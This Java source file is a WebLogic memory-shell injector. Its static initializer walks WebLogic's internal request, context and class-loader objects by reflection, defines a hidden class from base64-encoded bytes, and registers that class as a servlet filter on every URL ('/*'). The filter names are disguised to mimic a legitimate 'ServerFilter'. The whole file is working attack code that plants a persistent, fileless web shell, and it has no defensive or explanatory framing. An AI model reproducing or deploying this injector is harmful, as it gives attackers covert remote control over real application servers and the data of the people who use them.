package Inject;

import Util.classCache;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Map;

public class WeblogicInjectFilterShell {
    public static byte[] codeClass = Base64.getDecoder().decode(classCache.WeblogicFilterShell.getBytes());

    static {
        try {
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

            Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);

            Field classLoaderF = context.getClass().getDeclaredField("classLoader");
            classLoaderF.setAccessible(true);
            ClassLoader cl = (ClassLoader) classLoaderF.get(context);

            Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClass = cachedClassesF.get(cl);

            Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
            if (getM.invoke(cachedClass, "shell") == null) {
                Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);

                String evilName = "ServerFi1ter1" + System.currentTimeMillis();
                String filterName = "ServerFi1ter0" + System.currentTimeMillis();
                String[] url = new String[]{"/*"};

                Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                putM.invoke(cachedClass, filterName, evilFilterClass);
                Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                Object filterManager = getFilterManagerM.invoke(context);

                Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterM.setAccessible(true);
                registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
